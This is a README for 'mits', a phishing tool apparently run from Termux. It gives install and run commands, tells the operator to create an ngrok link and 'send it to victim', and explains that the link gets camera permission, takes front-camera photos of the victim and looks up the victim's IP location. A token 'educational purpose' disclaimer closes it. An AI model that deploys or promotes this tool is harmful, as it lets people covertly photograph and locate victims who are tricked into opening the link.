<h1>mits</h1>
                                                   
<p>Using mits tool you can generat different phishing links of wishing or custom sites which can grab victim front camera pictures and also gives you lockup information of target ip address.
<p1>

<h3>Installation</h3>

$ pkg install php

$ pkg install wget

$ pkg install openssh

$ git clone https://github.com/codingnerd7/mits.git

<h3>Usage</h3>

$ cd mits

Now turn your device hotspot

$ ./mits.sh

<p>Sometimes server is down so always go with ngrok for instant link and wait until it generates url for then send it to victim.
</p>
 
<h4>Note :- If victim open this url in chrome or android inbuilt browser then it can access victim camera by allowing permissions and send snap to you.
</h4>

>The captured images will be stored in captured folder. Run the following script to copy it to pictures folder

```bash
$ chmod +x copy.sh
$ ./copy.sh
```

This information is only for educational purpose and we are not responsible for any kind of illegal activity done by this tool.


                                            Inspired By github.com/thelinuxchoice
